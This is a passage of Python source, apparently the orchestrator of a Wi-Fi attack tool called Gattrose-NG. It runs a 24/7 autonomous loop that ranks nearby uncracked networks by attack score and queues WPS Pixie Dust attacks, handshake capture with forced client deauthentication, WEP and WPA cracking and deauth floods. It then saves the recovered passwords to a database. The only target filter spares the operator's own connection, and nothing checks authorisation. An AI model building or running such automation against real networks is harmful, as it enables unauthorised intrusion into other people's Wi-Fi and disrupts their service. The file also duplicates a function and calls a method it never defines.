                    # Safety check - don't attack our own connection
                    if self.network_safety:
                        is_safe, reason = self.network_safety.is_safe_to_attack(network.bssid, network.ssid)
                        if not is_safe:
                            print(f"[SAFETY] Skipping {network.bssid} ({network.ssid}): {reason}")
                            continue

                    # Check if already cracked (would be in permanent Networks table)
                    from src.database.models import Network
                    perm_net = session.query(Network).filter_by(bssid=network.bssid).first()
                    if perm_net and perm_net.is_cracked:
                        continue  # Skip already cracked

                    # Add to cracking queue
                    self.wps_service.add_target(
                        bssid=network.bssid,
                        ssid=network.ssid or "",
                        channel=network.channel or 1,
                        priority=int(network.attack_score or 50)  # Higher score = higher priority
                    )
                    added_count += 1

                print(f"[PLATEAU] Added {added_count} WPS networks to cracking queue")

            finally:
                session.close()

        except Exception as e:
            print(f"[!] Error queuing WPS networks: {e}")
            import traceback
            traceback.print_exc()

    def _start_auto_attack_cycle(self):
        """Start 24/7 autonomous attack cycle for queuing uncracked targets"""
        # Check if 24/7 mode is enabled
        if not self.config or not self.config.get('service.scan_24_7', False):
            print("[i] 24/7 auto-attack disabled (requires 24/7 scan mode)")
            return

        if not self.attack_queue:
            print("[!] Attack queue not initialized - auto-attack disabled")
            return

        print("[*] Starting 24/7 auto-attack cycle...")

        def auto_attack_loop():
            while self.running:
                try:
                    time.sleep(60)  # Check every 60 seconds
                    self._auto_attack_cycle()
                except Exception as e:
                    print(f"[!] Auto-attack cycle error: {e}")
                    import traceback
                    traceback.print_exc()

        self.auto_attack_thread = threading.Thread(target=auto_attack_loop, daemon=True)
        self.auto_attack_thread.start()
        print("[+] 24/7 auto-attack cycle started")

    def _auto_attack_cycle(self):
        """Query database for uncracked targets and queue attacks autonomously"""
        try:
            from src.database.models import get_session, Network

            session = get_session()
            try:
                # Query for high-value uncracked networks
                # Prioritize by attack score (higher = easier/more valuable target)
                uncracked = session.query(Network).filter(
                    (Network.password == None) | (Network.password == ""),
                    Network.is_cracked == False,
                    Network.current_attack_score > 0
                ).order_by(Network.current_attack_score.desc()).limit(50).all()

                if not uncracked:
                    return  # No targets to queue

                # Check existing queue to avoid duplicates
                queued_bssids = set()
                with self.attack_queue._lock:
                    # Check queued jobs
                    for job in self.attack_queue.queue:
                        queued_bssids.add(job.target_bssid)
                    # Check current job
                    if self.attack_queue.current_job:
                        queued_bssids.add(self.attack_queue.current_job.target_bssid)

                # Ensure NetworkManager is still running
                if self.network_safety:
                    self.network_safety.ensure_networkmanager_running()

                # Queue targets based on encryption type
                added_count = 0
                for network in uncracked:
                    if network.bssid in queued_bssids:
                        continue  # Already queued

                    # Safety check - don't attack our own connection
                    if self.network_safety:
                        is_safe, reason = self.network_safety.is_safe_to_attack(network.bssid, network.ssid)
                        if not is_safe:
                            print(f"[AUTO-ATTACK] Skipping {network.bssid} ({network.ssid}): {reason}")
                            # Add to database blacklist
                            network.blacklisted = True
                            network.blacklist_reason = reason
                            session.commit()
                            continue

                    # Determine attack type based on encryption
                    if network.wps_enabled and not network.wps_locked:
                        # WPS attack (HIGHEST priority - easiest and fastest to crack)
                        job = AttackJob(
                            attack_type=AttackType.WPS_PIXIE,  # Try Pixie Dust first
                            target_bssid=network.bssid,
                            params={
                                'ssid': network.ssid or "",
                                'channel': network.channel or 1,
                                'priority': min(22, int(network.attack_score / 10) + 19),  # 19-22 (ALWAYS first)
                                'estimated_duration': 300  # 5 minutes
                            }
                        )
                        self.attack_queue.add_job(job)
                        added_count += 1

                    elif 'WPA' in (network.encryption or ''):
                        # WPA/WPA2 - need handshake first
                        # Calculate priority based on attack_score (default to 50 if missing)
                        attack_score = getattr(network, 'attack_score', 50) or 50
                        priority = min(8, int(attack_score / 10) + 5)  # 5-8

                        job = AttackJob(
                            attack_type=AttackType.HANDSHAKE_CAPTURE,
                            target_bssid=network.bssid,
                            params={
                                'ssid': network.ssid or "",
                                'channel': network.channel or 1,
                                'priority': priority,
                                'estimated_duration': 600,  # 10 minutes
                                'deauth_clients': True  # Force deauth to capture handshake
                            }
                        )
                        self.attack_queue.add_job(job)
                        added_count += 1

                    elif 'WEP' in (network.encryption or ''):
                        # WEP attack
                        # Calculate priority based on attack_score (default to 50 if missing)
                        attack_score = getattr(network, 'attack_score', 50) or 50
                        priority = min(9, int(attack_score / 10) + 6)  # 6-9

                        job = AttackJob(
                            attack_type=AttackType.WEP_CRACK,
                            target_bssid=network.bssid,
                            params={
                                'ssid': network.ssid or "",
                                'channel': network.channel or 1,
                                'priority': priority,
                                'estimated_duration': 1800  # 30 minutes
                            }
                        )
                        self.attack_queue.add_job(job)
                        added_count += 1

                if added_count > 0:
                    print(f"[AUTO-ATTACK] Queued {added_count} new targets (from {len(uncracked)} uncracked networks)")

            finally:
                session.close()

        except Exception as e:
            print(f"[!] Auto-attack cycle error: {e}")
            import traceback
            traceback.print_exc()

    def _start_queue_processor(self):
        """Start attack queue processor to execute queued attacks"""
        if not self.attack_queue:
            print("[!] Attack queue not initialized - queue processor disabled")
            return

        print("[*] Starting attack queue processor...")

        def queue_processor_loop():
            while self.running:
                try:
                    # Check if we can process next job
                    if self.attack_queue.current_job:
                        # Job already running, wait
                        time.sleep(5)
                        continue

                    # Get next job from queue
                    job = self.attack_queue.get_next_job()
                    if not job:
                        # No jobs in queue, wait
                        time.sleep(10)
                        continue

                    # Execute the job
                    self.attack_queue.current_job = job
                    self._execute_attack_job(job)

                except Exception as e:
                    print(f"[!] Queue processor error: {e}")
                    import traceback
                    traceback.print_exc()
                    time.sleep(5)

        self.queue_processor_thread = threading.Thread(target=queue_processor_loop, daemon=True)
        self.queue_processor_thread.start()
        print("[+] Attack queue processor started")

    def _execute_attack_job(self, job: AttackJob):
        """Execute a single attack job using the appropriate service"""
        try:
            print(f"\n[ATTACK] Starting {job.attack_type.value} on {job.target_ssid} ({job.target_bssid})")
            print(f"[ATTACK] Priority: {job.priority}, Estimated duration: {job.estimated_duration}s")

            job.start()

            # Update attack tracking
            self.attack_in_progress = True
            self.attack_type = job.attack_type.value
            self.attack_target_bssid = job.target_bssid
            self.attack_target_ssid = job.target_ssid
            self.attack_start_time = datetime.now()

            # Route to appropriate attack service
            result = None
            success = False

            if job.attack_type == AttackType.WPS_PIXIE or job.attack_type == AttackType.WPS_PIN:
                if self.wps_attack_service:
                    result = self._execute_wps_attack(job)
                    success = result.get('success', False) if result else False
                else:
                    job.fail("WPS attack service not initialized")

            elif job.attack_type == AttackType.HANDSHAKE_CAPTURE:
                if self.handshake_service:
                    result = self._execute_handshake_capture(job)
                    success = result.get('success', False) if result else False
                else:
                    job.fail("Handshake service not initialized")

            elif job.attack_type == AttackType.WEP_CRACK:
                if self.wep_crack_service:
                    result = self._execute_wep_crack(job)
                    success = result.get('success', False) if result else False
                else:
                    job.fail("WEP crack service not initialized")

            elif job.attack_type == AttackType.WPA_CRACK or job.attack_type == AttackType.WPA2_CRACK:
                if self.wpa_crack_service:
                    result = self._execute_wpa_crack(job)
                    success = result.get('success', False) if result else False
                else:
                    job.fail("WPA crack service not initialized")

            elif job.attack_type == AttackType.DEAUTH:
                if self.deauth_service:
                    result = self._execute_deauth(job)
                    success = result.get('success', False) if result else False
                else:
                    job.fail("Deauth service not initialized")

            # Mark job complete or failed
            if success:
                job.complete(result)
                self.attack_queue.completed_jobs.append(job)
                print(f"[ATTACK] ✓ {job.attack_type.value} SUCCESSFUL on {job.target_ssid}")
                if result and result.get('password'):
                    print(f"[ATTACK] Password: {result['password']}")
            else:
                error_msg = result.get('error', 'Unknown error') if result else 'Failed to execute'
                job.fail(error_msg)
                self.attack_queue.failed_jobs.append(job)
                print(f"[ATTACK] ✗ {job.attack_type.value} FAILED on {job.target_ssid}: {error_msg}")

        except Exception as e:
            job.fail(str(e))
            self.attack_queue.failed_jobs.append(job)
            print(f"[ATTACK] ✗ Exception during {job.attack_type.value}: {e}")
            import traceback
            traceback.print_exc()

        finally:
            # Clear current job
            self.attack_queue.current_job = None
            self.attack_in_progress = False
            self.attack_type = None
            self.attack_target_bssid = None
            self.attack_target_ssid = None

    def _execute_wps_attack(self, job: AttackJob) -> dict:
        """Execute WPS attack using WPS attack service"""
        try:
            bssid = job.target_bssid
            ssid = job.target_ssid or ""
            channel = str(job.params.get('channel', '1'))

            print(f"[WPS] Executing {job.attack_type.value} attack on {ssid} ({bssid}), channel {channel}")

            # Emit attack started event
            if self.event_manager:
                self.event_manager.emit_attack_started(job.attack_type.value, bssid, ssid)

            # Progress callback
            def progress_cb(percent):
                job.progress = percent

            # Status callback for logging
            def status_cb(message):
                print(f"[WPS] {message}")

            # Execute attack based on type
            if job.attack_type == AttackType.WPS_PIXIE:
                result = self.wps_attack_service.start_pixie_attack(
                    bssid=bssid,
                    channel=channel,
                    essid=ssid,
                    progress_callback=progress_cb,
                    status_callback=status_cb
                )
            elif job.attack_type == AttackType.WPS_PIN:
                # PIN bruteforce - not implemented yet but service supports it
                result = {'success': False, 'error': 'WPS PIN bruteforce not yet wired up'}
            else:
                result = {'success': False, 'error': f'Unknown WPS attack type: {job.attack_type}'}

            # Emit attack finished event
            if self.event_manager:
                self.event_manager.emit_attack_finished(job.attack_type.value, bssid, ssid, result.get('success', False))

            # If successful, update database with password
            if result.get('success') and result.get('psk'):
                self._update_network_password(bssid, result['psk'], result.get('pin'))

            return result

        except Exception as e:
            error_msg = f"WPS attack exception: {e}"
            print(f"[WPS] {error_msg}")
            import traceback
            traceback.print_exc()

            # Emit attack finished (failed) event
            if self.event_manager:
                self.event_manager.emit_attack_finished(job.attack_type.value, job.target_bssid, job.target_ssid or "", False)

            return {'success': False, 'error': error_msg}

    def _update_network_password(self, bssid: str, password: str, pin: str = None):
        """Update network in database with cracked password"""
        try:
            from src.database.models import get_session, Network

            session = get_session()
            try:
                network = session.query(Network).filter_by(bssid=bssid).first()
                if network:
                    ssid = network.ssid
                    crack_method = 'WPS' if pin else 'Unknown'

                    network.password = password
                    network.is_cracked = True
                    network.crack_method = crack_method
                    network.cracked_at = datetime.now()
                    if pin:
                        network.wps_pin = pin
                    session.commit()
                    print(f"[DB] ✓ Updated password for {bssid}: {password}")

                    # Emit password cracked event
                    if self.event_manager:
                        self.event_manager.emit_password_cracked(bssid, ssid, password, crack_method)
                else:
                    print(f"[DB] Warning: Network {bssid} not found in permanent table")
            finally:
                session.close()

        except Exception as e:
            print(f"[DB] Error updating network password: {e}")

    def _execute_handshake_capture(self, job: AttackJob) -> dict:
        """Execute handshake capture"""
        try:
            bssid = job.target_bssid
            ssid = job.target_ssid or ""
            channel = str(job.params.get('channel', '1'))
            timeout = job.params.get('timeout', 600)
            deauth_clients = job.params.get('deauth_clients', True)

            print(f"[HANDSHAKE] Capturing handshake from {ssid} ({bssid}) on channel {channel}")

            # Emit attack started event
            if self.event_manager:
                self.event_manager.emit_attack_started('handshake', bssid, ssid)

            # Progress callback
            def progress_cb(percent):
                job.progress = percent

            # Status callback
            def status_cb(message):
                print(f"[HANDSHAKE] {message}")

            # Execute handshake capture
            result = self.handshake_service.capture_handshake(
                bssid=bssid,
                channel=channel,
                essid=ssid,
                timeout=timeout,
                auto_deauth=deauth_clients,
                progress_callback=progress_cb,
                status_callback=status_cb
            )

            # Emit attack finished event
            if self.event_manager:
                self.event_manager.emit_attack_finished('handshake', bssid, ssid, result.get('success', False))

            # If successful, save handshake to database
            if result.get('success'):
                self._save_handshake_to_db(bssid, ssid, result['file'])

            return result

        except Exception as e:
            error_msg = f"Handshake capture exception: {e}"
            print(f"[HANDSHAKE] {error_msg}")
            import traceback
            traceback.print_exc()

            if self.event_manager:
                self.event_manager.emit_attack_finished('handshake', job.target_bssid, job.target_ssid or "", False)

            return {'success': False, 'error': error_msg}

    def _save_handshake_to_db(self, bssid: str, ssid: str, file_path: str):
        """Save captured handshake to database"""
        try:
            from src.database.models import get_session, Network, Handshake
            import hashlib

            session = get_session()
            try:
                network = session.query(Network).filter_by(bssid=bssid).first()
                if not network:
                    print(f"[DB] Warning: Network {bssid} not found in database")
                    return

                # Calculate file hash
                with open(file_path, 'rb') as f:
                    file_hash = hashlib.sha256(f.read()).hexdigest()

                # Verify handshake completeness using detailed EAPOL analysis
                from src.services.handshake_analysis import HandshakeAnalyzer
                analyzer = HandshakeAnalyzer()
                analysis = analyzer.analyze_handshake(file_path, bssid)

                completeness_score = analysis.get('completeness_score', 0)
                is_complete = completeness_score >= 60  # At least M1+M2 required

                # Create handshake record
                handshake = Handshake(
                    network_id=network.id,
                    file_path=file_path,
                    file_hash=file_hash,
                    handshake_type='WPA2',
                    is_complete=is_complete
                )
                session.add(handshake)
                session.commit()
                print(f"[DB] ✓ Saved handshake for {bssid} (completeness: {completeness_score}%, complete: {is_complete})")

            finally:
                session.close()

        except Exception as e:
            print(f"[DB] Error saving handshake: {e}")

    def _execute_wep_crack(self, job: AttackJob) -> dict:
        """Execute WEP crack"""
        try:
            bssid = job.target_bssid
            ssid = job.target_ssid or ""
            channel = str(job.params.get('channel', '1'))
            timeout = job.params.get('timeout', 1800)
            use_arp_replay = job.params.get('use_arp_replay', True)

            print(f"[WEP] Cracking {ssid} ({bssid}) on channel {channel}")

            # Emit attack started event
            if self.event_manager:
                self.event_manager.emit_attack_started('wep', bssid, ssid)

            # Progress callback
            def progress_cb(percent):
                job.progress = percent

            # Status callback
            def status_cb(message):
                print(f"[WEP] {message}")

            # Execute WEP crack
            result = self.wep_crack_service.crack_wep(
                bssid=bssid,
                channel=channel,
                essid=ssid,
                timeout=timeout,
                use_arp_replay=use_arp_replay,
                progress_callback=progress_cb,
                status_callback=status_cb
            )

            # Emit attack finished event
            if self.event_manager:
                self.event_manager.emit_attack_finished('wep', bssid, ssid, result.get('success', False))

            # If successful, update database with key
            if result.get('success') and result.get('key'):
                self._update_network_password(bssid, result['key'])

            return result

        except Exception as e:
            error_msg = f"WEP crack exception: {e}"
            print(f"[WEP] {error_msg}")
            import traceback
            traceback.print_exc()

            if self.event_manager:
                self.event_manager.emit_attack_finished('wep', job.target_bssid, job.target_ssid or "", False)

            return {'success': False, 'error': error_msg}

    def _execute_wpa_crack(self, job: AttackJob) -> dict:
        """Execute WPA/WPA2 crack"""
        try:
            bssid = job.target_bssid
            ssid = job.target_ssid or ""
            handshake_file = job.params.get('handshake_file')
            wordlist_size = job.params.get('wordlist_size', 10000000)
            use_rules = job.params.get('use_rules', False)

            if not handshake_file:
                return {'success': False, 'error': 'No handshake file provided'}

            print(f"[WPA] Cracking {ssid} ({bssid}) with {wordlist_size:,} passwords")

            # Emit attack started event
            if self.event_manager:
                self.event_manager.emit_attack_started('wpa_crack', bssid, ssid)

            # Progress callback
            def progress_cb(percent):
                job.progress = percent

            # Status callback
            def status_cb(message):
                print(f"[WPA] {message}")

            # Execute WPA crack
            result = self.wpa_crack_service.crack_handshake(
                handshake_file=handshake_file,
                bssid=bssid,
                essid=ssid,
                wordlist_size=wordlist_size,
                progress_callback=progress_cb,
                status_callback=status_cb,
                use_rules=use_rules
            )

            # Emit attack finished event
            if self.event_manager:
                self.event_manager.emit_attack_finished('wpa_crack', bssid, ssid, result.get('success', False))

            # If successful, update database with password
            if result.get('success') and result.get('password'):
                self._update_network_password(bssid, result['password'])

            return result

        except Exception as e:
            error_msg = f"WPA crack exception: {e}"
            print(f"[WPA] {error_msg}")
            import traceback
            traceback.print_exc()

            if self.event_manager:
                self.event_manager.emit_attack_finished('wpa_crack', job.target_bssid, job.target_ssid or "", False)

            return {'success': False, 'error': error_msg}

    def _execute_deauth(self, job: AttackJob) -> dict:
        """Execute deauth attack"""
        try:
            bssid = job.target_bssid
            ssid = job.target_ssid or ""
            client_mac = job.params.get('client_mac')
            count = job.params.get('count', 10)
            duration = job.params.get('duration')

            # Emit attack started event
            if self.event_manager:
                self.event_manager.emit_attack_started('deauth', bssid, ssid)

            # Status callback
            def status_cb(message):
                print(f"[DEAUTH] {message}")

            # Execute deauth attack
            if duration:
                # Continuous deauth for specified duration
                print(f"[DEAUTH] Continuous deauth on {ssid} ({bssid}) for {duration}s")
                result = self.deauth_service.continuous_deauth(
                    ap_bssid=bssid,
                    client_mac=client_mac,
                    duration=duration,
                    status_callback=status_cb
                )
            elif client_mac:
                # Deauth specific client
                print(f"[DEAUTH] Deauthing client {client_mac} from {ssid} ({bssid})")
                result = self.deauth_service.deauth_client(
                    ap_bssid=bssid,
                    client_mac=client_mac,
                    count=count,
                    status_callback=status_cb
                )
            else:
                # Broadcast deauth to all clients
                print(f"[DEAUTH] Deauthing all clients from {ssid} ({bssid})")
                result = self.deauth_service.deauth_all_clients(
                    ap_bssid=bssid,
                    count=count,
                    status_callback=status_cb
                )

            # Emit attack finished event
            if self.event_manager:
                self.event_manager.emit_attack_finished('deauth', bssid, ssid, result.get('success', False))

            return result

        except Exception as e:
            error_msg = f"Deauth exception: {e}"
            print(f"[DEAUTH] {error_msg}")
            import traceback
            traceback.print_exc()

            if self.event_manager:
                self.event_manager.emit_attack_finished('deauth', job.target_bssid, job.target_ssid or "", False)

            return {'success': False, 'error': error_msg}

    def _start_status_updater(self):
        """Start background thread that updates status file"""
        def update_loop():
            while self.running:
                try:
                    self._write_status_file()
                    time.sleep(2)  # Update every 2 seconds
                except Exception as e:
                    print(f"[!] Status update error: {e}")

        self.status_thread = threading.Thread(target=update_loop, daemon=True)
        self.status_thread.start()

    def _update_service_status(self, service_name: str, status: str,
                              error_message: Optional[str] = None,
                              metadata: Optional[Dict] = None):
        """Update service status"""
        with self._lock:
            if service_name in self.services:
                svc = self.services[service_name]
                old_status = svc.status
                svc.status = status
                svc.running = (status == 'running')
                svc.error_message = error_message
                svc.last_update = datetime.now()

                if metadata:
                    svc.metadata.update(metadata)

                # Emit service status event if status changed
                if old_status != status:
                    try:
                        message_parts = [f"Status: {status}"]
                        if error_message:
                            message_parts.append(f"Error: {error_message}")
                        if metadata:
                            for key, val in list(metadata.items())[:3]:  # First 3 metadata items
                                message_parts.append(f"{key}: {val}")

                        get_event_manager().emit_service_status(
                            service=svc.name,
                            status=status,
                            message="\n".join(message_parts)
                        )
                    except Exception as e:
                        print(f"[!] Error emitting service status event: {e}")

    def get_status(self) -> Dict[str, Any]:
        """Get current status of all services"""
        with self._lock:
            # Update GPS metadata
            if self.gps_service:
                lat, lon, alt, acc, source = self.gps_service.get_location()
                self.services['gps'].metadata.update({
                    'has_location': lat is not None,
                    'source': source or 'none',
                    'fix_quality': self.gps_service.get_fix_quality(),
                    'latitude': lat,
                    'longitude': lon,
                    'accuracy': acc
                })

            # Update database stats
            if self.scan_db_service:
                try:
                    networks = self.scan_db_service.get_all_networks()
                    clients = self.scan_db_service.get_all_clients()
                    self.services['upsert'].metadata.update({
                        'networks_count': len(networks),
                        'clients_count': len(clients)
                    })
                except:
                    pass

            # Update scanner heartbeat
            if self.scanner:
                try:
                    process_alive = self.scanner.is_process_alive()
                    process_pid = self.scanner.get_process_pid()
                    self.services['scanner'].metadata.update({
                        'heartbeat': 'alive' if process_alive else 'dead',
                        'process_pid': process_pid
                    })
                except:
                    pass

            # Get attack queue stats
            queue_stats = {
                'queued': 0,
                'running': 0,
                'completed': 0,
                'failed': 0
            }
            if self.attack_queue:
                with self.attack_queue._lock:
                    queue_stats['queued'] = len(self.attack_queue.queue)
                    queue_stats['running'] = 1 if self.attack_queue.current_job else 0
                    queue_stats['completed'] = len(self.attack_queue.completed_jobs)
                    queue_stats['failed'] = len(self.attack_queue.failed_jobs)

                # Update attack_queue service metadata
                if 'attack_queue' in self.services:
                    self.services['attack_queue'].metadata.update(queue_stats)

            # Build status dict
            status = {
                'orchestrator': {
                    'running': self.running,
                    'timestamp': datetime.now().isoformat()
                },
                'services': {
                    name: svc.to_dict()
                    for name, svc in self.services.items()
                },
                'attack': {
                    'in_progress': self.attack_in_progress,
                    'type': self.attack_type,
                    'target_bssid': self.attack_target_bssid,
                    'target_ssid': self.attack_target_ssid,
                    'start_time': self.attack_start_time.isoformat() if self.attack_start_time else None
                },
                'queue': queue_stats
            }

            return status

    def start_attack(self, attack_type: str, target_bssid: str, target_ssid: str = None):
        """
        Register that an attack has started

        Args:
            attack_type: Type of attack ('wep', 'wpa', 'wps', 'pixie', 'deauth', etc.)
            target_bssid: BSSID of target network
            target_ssid: SSID of target network (optional)
        """
        with self._lock:
            self.attack_in_progress = True
            self.attack_type = attack_type
            self.attack_target_bssid = target_bssid
            self.attack_target_ssid = target_ssid
            self.attack_start_time = datetime.now()
            print(f"[*] Attack started: {attack_type} on {target_ssid or target_bssid}")
            self._write_status_file()

    def stop_attack(self):
        """Register that an attack has completed"""
        with self._lock:
            if self.attack_in_progress:
                print(f"[*] Attack completed: {self.attack_type} on {self.attack_target_ssid or self.attack_target_bssid}")
            self.attack_in_progress = False
            self.attack_type = None
            self.attack_target_bssid = None
            self.attack_target_ssid = None
            self.attack_start_time = None
            self._write_status_file()

    def is_attack_in_progress(self) -> bool:
        """Check if an attack is currently running"""
        with self._lock:
            return self.attack_in_progress

    def _write_status_file(self):
        """Write status to file for IPC"""
        try:
            status = self.get_status()
            with open(self.status_file, 'w') as f:
                json.dump(status, f, indent=2)
        except Exception as e:
            print(f"[!] Error writing status file: {e}")

    def stop(self):
        """Stop all services"""
        print("\n[*] Stopping orchestrator...")

        self.running = False

        # Stop scanner
        if hasattr(self, 'scanner_running') and self.scanner_running:
            try:
                print("[*] Stopping WiFi scanner...")
                self.scanner_running = False
                if hasattr(self, 'scanner_process') and self.scanner_process:
                    try:
                        self.scanner_process.terminate()
                        self.scanner_process.wait(timeout=5)
                    except:
                        try:
                            self.scanner_process.kill()
                        except:
                            pass
                self._update_service_status('scanner', 'stopped')
            except Exception as e:
                print(f"[!] Error stopping scanner: {e}")

        # Stop scan database service
        if self.scan_db_service:
            try:
                print("[*] Stopping database upsert worker...")
                self.scan_db_service.stop_upsert_worker()
                self._update_service_status('upsert', 'stopped')
                self._update_service_status('triangulation', 'stopped')
            except Exception as e:
                print(f"[!] Error stopping scan database service: {e}")

        # Stop GPS
        if self.gps_service:
            try:
                print("[*] Stopping GPS service...")
                self.gps_service.stop()
                self._update_service_status('gps', 'stopped')
            except Exception as e:
                print(f"[!] Error stopping GPS: {e}")

        # Stop phone tray
        if self.phone_tray_process:
            try:
                print("[*] Stopping phone tray...")
                import subprocess
                import signal
                # Send SIGTERM for graceful shutdown
                subprocess.run(['kill', '-15', str(self.phone_tray_process)],
                             timeout=5, check=False)
                self._update_service_status('phone_tray', 'stopped')
            except Exception as e:
                print(f"[!] Error stopping phone tray: {e}")

        # Clean up status file
        if self.status_file.exists():
            self.status_file.unlink()

        print("[+] Orchestrator stopped")

    def print_status(self):
        """Print current status to console"""
        status = self.get_status()

        print("\n" + "=" * 70)
        print("Service Status")
        print("=" * 70)
        print(f"Timestamp: {status['orchestrator']['timestamp']}")
        print()

        for name, svc_data in status['services'].items():
            status_icon = "✓" if svc_data['running'] else "✗"
            status_text = svc_data['status'].upper()

            print(f"{status_icon} {svc_data['name']:20s} [{status_text}]")

            if svc_data['error_message']:
                print(f"   Error: {svc_data['error_message']}")

            if svc_data['metadata']:
                for key, value in svc_data['metadata'].items():
                    print(f"   {key}: {value}")

        print("=" * 70 + "\n")

    def restart_service(self, service_name: str) -> bool:
        """
        Restart an individual service by its name

        Args:
            service_name: Name of the service to restart (e.g., 'scanner', 'gps', 'database')

        Returns:
            True if restart was initiated, False if service doesn't exist
        """
        if service_name not in self.services:
            print(f"[!] Unknown service: {service_name}")
            return False

        service = self.services[service_name]
        service_display = service.name

        print(f"[*] Restarting service: {service_display}")

        # Mark service as restarting
        service.running = False
        service.status = "restarting"
        self.update_status_file()

        # Stop the service based on its type
        try:
            if service_name == 'scanner':
                # Stop scanner service
                if hasattr(self, 'scanner_service') and self.scanner_service:
                    try:
                        self.scanner_service.stop()
                        self.scanner_service.join(timeout=3)
                    except:
                        pass
                # Restart using built-in method
                self._auto_start_scanner()
                print(f"[+] {service_display} restarted")

            elif service_name == 'gps':
                # Stop GPS service
                if hasattr(self, 'gps_service') and self.gps_service:
                    try:
                        self.gps_service.stop()
                        self.gps_service.join(timeout=3)
                    except:
                        pass
                # Restart using built-in method
                self._start_gps()
                print(f"[+] {service_display} restarted")

            elif service_name == 'upsert':
                # Stop upsert worker
                if hasattr(self, 'scan_db_service') and self.scan_db_service:
                    try:
                        self.scan_db_service.stop_upsert_worker()
                        time.sleep(1)
                        self.scan_db_service.start_upsert_worker()
                        self._update_service_status('upsert', 'running', metadata={
                            'interval': self.scan_db_service.upsert_interval
                        })
                        print(f"[+] {service_display} restarted")
                    except Exception as e:
                        raise Exception(f"Upsert restart failed: {e}")

            elif service_name == 'database':
                # Database cannot be restarted without restarting orchestrator
                print(f"[i] {service_display} requires orchestrator restart")
                service.running = True
                service.status = "running"

            else:
                # For other services, just mark as restarted for now
                # These services may need specific restart logic implemented
                print(f"[i] Service {service_display} restart not fully implemented yet")
                service.running = True
                service.status = "running"

            self.update_status_file()
            return True

        except Exception as e:
            print(f"[!] Error restarting {service_display}: {e}")
            service.running = False
            service.status = "error"
            service.error_message = str(e)
            self.update_status_file()
            return False

    def process_commands(self):
        """
        Process commands from the command file

        Commands are written by the tray app to /tmp/gattrose-commands.json
        Format: {'commands': [{'action': 'restart_service', 'service': 'scanner', 'timestamp': 123456}]}
        """
        commands_file = Path("/tmp/gattrose-commands.json")

        if not commands_file.exists():
            return

        try:
            # Read commands
            with open(commands_file, 'r') as f:
                data = json.load(f)

            commands = data.get('commands', [])

            if not commands:
                return

            # Process each command
            for command in commands:
                action = command.get('action')
                service_name = command.get('service')

                if action == 'restart_service' and service_name:
                    print(f"\n[*] Processing command: restart {service_name}")
                    self.restart_service(service_name)

            # Clear processed commands
            commands_file.unlink()

        except json.JSONDecodeError:
            # Malformed JSON, remove it
            commands_file.unlink()
        except Exception as e:
            print(f"[!] Error processing commands: {e}")


# Singleton instance
_orchestrator_instance = None


def get_orchestrator(auto_start: bool = True) -> OrchestratorService:
    """Get singleton orchestrator instance"""
    global _orchestrator_instance

    if _orchestrator_instance is None:
        _orchestrator_instance = OrchestratorService(auto_start=auto_start)

    return _orchestrator_instance


def main():
    """Main entry point for standalone orchestrator service"""
    import argparse

    parser = argparse.ArgumentParser(description="Gattrose-NG Orchestrator Service")
    parser.add_argument('--no-auto-start', action='store_true',
                       help='Do not automatically start services')
    parser.add_argument('--status', action='store_true',
                       help='Print status and exit')
    args = parser.parse_args()

    # Create orchestrator
    orchestrator = OrchestratorService(auto_start=not args.no_auto_start)
    set_orchestrator(orchestrator)

    if args.status:
        orchestrator.print_status()
        return

    # Set up signal handlers for graceful shutdown
    def signal_handler(signum, frame):
        print(f"\n[*] Received signal {signum}")
        orchestrator.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Print initial status
    orchestrator.print_status()

    # Keep running
    print("[i] Orchestrator running. Press Ctrl+C to stop.")
    print("[i] Services are managed automatically.")
    print()

    try:
        while orchestrator.running:
            time.sleep(5)
            # Process any commands from tray or GUI
            orchestrator.process_commands()
            # Periodically print status
            # orchestrator.print_status()
    except KeyboardInterrupt:
        pass
    finally:
        orchestrator.stop()


def get_orchestrator() -> Optional[OrchestratorService]:
    """Get the global orchestrator instance"""
    global _orchestrator_instance
    return _orchestrator_instance


def set_orchestrator(orchestrator: OrchestratorService):
    """Set the global orchestrator instance"""
    global _orchestrator_instance
    _orchestrator_instance = orchestrator


if __name__ == "__main__":
    main()
